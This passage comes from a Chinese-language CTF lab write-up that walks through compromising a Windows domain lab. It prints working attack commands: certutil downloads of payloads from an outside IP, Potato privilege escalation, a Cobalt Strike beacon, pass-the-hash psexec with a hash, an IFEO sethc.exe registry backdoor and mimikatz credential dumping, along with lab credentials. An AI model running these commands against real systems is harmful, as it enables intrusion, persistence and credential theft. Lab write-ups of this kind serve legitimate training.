+<span class="line"><span>                  [06]: KB5013952</span></span>
+<span class="line"><span>网卡:             安装了 1 个 NIC。</span></span>
+<span class="line"><span>                  [01]: Red Hat VirtIO Ethernet Adapter</span></span>
+<span class="line"><span>                      连接名:      以太网 2</span></span>
+<span class="line"><span>                      启用 DHCP:   是</span></span>
+<span class="line"><span>                      DHCP 服务器: 172.22.255.253</span></span>
+<span class="line"><span>                      IP 地址</span></span>
+<span class="line"><span>                        [01]: 172.22.8.18</span></span>
+<span class="line"><span>                        [02]: fe80::95df:a060:ade9:6939</span></span>
+<span class="line"><span>Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。</span></span></code></pre>
+<p>whoami /priv</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>特权信息</span></span>
+<span class="line"><span>----------------------</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>特权名                        描述                 状态</span></span>
+<span class="line"><span>============================= ==================== ======</span></span>
+<span class="line"><span>SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用</span></span>
+<span class="line"><span>SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用</span></span>
+<span class="line"><span>SeChangeNotifyPrivilege       绕过遍历检查         已启用</span></span>
+<span class="line"><span>SeImpersonatePrivilege        身份验证后模拟客户端 已启用</span></span>
+<span class="line"><span>SeCreateGlobalPrivilege       创建全局对象         已启用</span></span>
+<span class="line"><span>SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span></span></code></pre>
+<p>因为是 mssql 服务账户, 考虑 Potato 系列提权</p>
+<p>这里被坑了一把, 一开始用的 Pipe Potato 反弹 cs 上线, 结果 hashdump, mimikatz 一直拒绝访问</p>
+<p>最后换成了 SweetPotato, 索性把各种 exe 都下载下来直接在 MDUT 里面运行</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">certutil</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -urlcache</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -split</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -f</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> http://1.117.70.230:65221/a.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> C:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\w</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">indows</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">emp</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\a</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">.exe</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">certutil</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -urlcache</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -split</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -f</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> http://1.117.70.230:65221/SweetPotato.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> C:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\w</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">indows</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">emp</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\S</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">weetPotato.exe</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307301603155.png" alt="image-20230730160340116"></p>
+<p>通过 SweetPotato 上线 cs</p>
+<p><img src="https://img.exp10it.io/img/202307301608966.png" alt="image-20230730160859932"></p>
+<p>flag01 在 Administrator 家目录下</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span> _________  ________  ________  ___       ___  _______   ________   _________</span></span>
+<span class="line"><span>|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\</span></span>
+<span class="line"><span>\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_|</span></span>
+<span class="line"><span>     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \</span></span>
+<span class="line"><span>      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \</span></span>
+<span class="line"><span>       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\</span></span>
+<span class="line"><span>        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|</span></span>
+<span class="line"><span>              \|_________|</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Getting flag01 is easy, right?</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>flag01: flag{REDACTED}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Maybe you should focus on user sessions...</span></span></code></pre>
+<h2 id="flag02">flag02</h2>
+<p>fscan 扫内网</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">beacon</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">> </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">shell</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> C:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\w</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">indows</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">emp</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\f</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">scan.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -h</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 172.22.8.0/24</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">] Tasked beacon to run: C:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\w</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">indows</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\t</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">emp</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\f</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">scan.exe -h 172.22.8.0/24</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[+] host called home, sent: 73 bytes</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[+] received output:</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">                              _</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">  /</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C"> \ </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ___</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> _</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ___</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> __</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> /</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /_</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">____/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> __</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> '__/ _` |/ __| |/ /</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">                     fscan version: 1.8.2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start infoscan</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">trying RunIcmp2</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">The current user permissions unable to send icmp packets</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start ping</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.8.15     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.8.18     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.8.46     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">(icmp) Target 172.22.8.31     is alive</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] Icmp alive hosts len is: 4</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.31:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:445 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.31:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:139 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.31:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15:135 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46:80 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:80 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:1433 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15:88 open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] alive ports len is: 16</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">start vulscan</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.8.18</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]WIN-WEB</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.8.18</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]2001:0:348b:fb58:1092:159f:d89d:8798</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.8.46</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]WIN2016</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.8.46</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.8.31</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]WIN19-CLIENT</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.8.31</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetInfo:</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*]172.22.8.15</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]DC01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">   [->]172.22.8.15</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.8.15     [+]DC XIAORANG\DC01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.8.31     XIAORANG\WIN19-CLIENT</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] NetBios: 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] WebTitle: http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[*] WebTitle: http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ</span></span></code></pre>
+<p>RDP</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15:3389</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.31:3389</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46:3389</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> open</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18:3389</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> open</span></span></code></pre>
+<p>NetBIOS</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.15</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> XIAORANG</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\D</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">C01</span><span style="--shiki-light:#C2C3C5;--shiki-light-font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 域控</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.31</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> XIAORANG</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\W</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">IN19-CLIENT</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.46</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> WIN2016.xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">172.22.8.18</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> WIN-WEB</span><span style="--shiki-light:#C2C3C5;--shiki-light-font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 本机</span></span></code></pre>
+<p>根据上文的提示, 直接创建一个管理员账号连接过去查看用户会话</p>
+<p><img src="https://img.exp10it.io/img/202307301612535.png" alt="image-20230730161210496"></p>
+<p><img src="https://img.exp10it.io/img/202307301613086.png" alt="image-20230730161334047"></p>
+<p>netstat 查看连接信息, 发现是从内网 <code>172.22.8.31 XIAORANG\WIN19-CLIENT</code> 上连过来的</p>
+<p><img src="https://img.exp10it.io/img/202307301627738.png" alt="image-20230730162720676"></p>
+<p>根据题目 tsclient, 参考文章如下</p>
+<p><a href="https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg">https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg</a></p>
+<p><a href="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.geekby.site/2021/01/红蓝对抗中rdp协议的利用</a></p>
+<p><a href="https://www.c0bra.xyz/2021/01/11/RDP%E5%8F%8D%E5%90%91%E6%94%BB%E5%87%BB/">https://www.c0bra.xyz/2021/01/11/RDP反向攻击</a></p>
+<p>得知需要模拟 John 用户的令牌, 并访问 <code>\\tsclient</code>共享 (172.22.8.31)</p>
+<p>这里也被坑了好长时间, 无论使用 cs 自带的 make token 还是 msf 的 incognito, 还是 SharpToken, 执行 <code>dir \\tsclient\c</code> 都显示拒绝访问, 很怪</p>
+<p>无奈翻了下网上的 Writeup, 提示需要 psexec 连过去再用 msf 上线, 之后再用 incognito 就能成功模拟令牌了</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">proxychains</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> psexec.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -hashes</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> :2caf35bb4c5059a3d50599844e2b9b1f</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator@172.22.8.18</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307301700602.png" alt="image-20230730170037549"></p>
+<p><img src="https://img.exp10it.io/img/202307301701350.png" alt="image-20230730170100304"></p>
+<p>credential.txt</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Do you know how to hijack Image?</span></span></code></pre>
+<p>一眼 IFEO 劫持</p>
+<p>域用户 RDP 连过去提示密码已过期</p>
+<p><img src="https://img.exp10it.io/img/202307301718470.png" alt="image-20230730171849407"></p>
+<p>修改密码后再次登录 <code>172.22.8.31</code> 提示登录失败, 因为不在 Remote Desktop Users 用户组内</p>
+<p><img src="https://img.exp10it.io/img/202307301719007.png" alt="image-20230730171953938"></p>
+<p>172.22.8.46 登录成功</p>
+<p><img src="https://img.exp10it.io/img/202307301729236.png" alt="image-20230730172942169"></p>
+<p>但只有普通用户权限, 需要提权</p>
+<p>根据上文的提示, 猜测能够直接修改注册表进行 IFEO 劫持</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">reg</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> add</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /v</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Debugger</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> REG_SZ</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /d</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">C:\Windows\System32\cmd.exe</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span></span></code></pre>
+<p>开始菜单锁定用户, 然后连按五次 shift</p>
+<p><img src="https://img.exp10it.io/img/202307301740869.png" alt="image-20230730174036811"></p>
+<p>flag02 在 Administrator 家目录下</p>
+<p><img src="https://img.exp10it.io/img/202307301741677.png" alt="image-20230730174159621"></p>
+<h2 id="flag03">flag03</h2>
+<p>logonpasswords</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">beacon</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">> </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">logonpasswords</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">] Tasked beacon to run Mimikatz inject pid:1928</span></span>
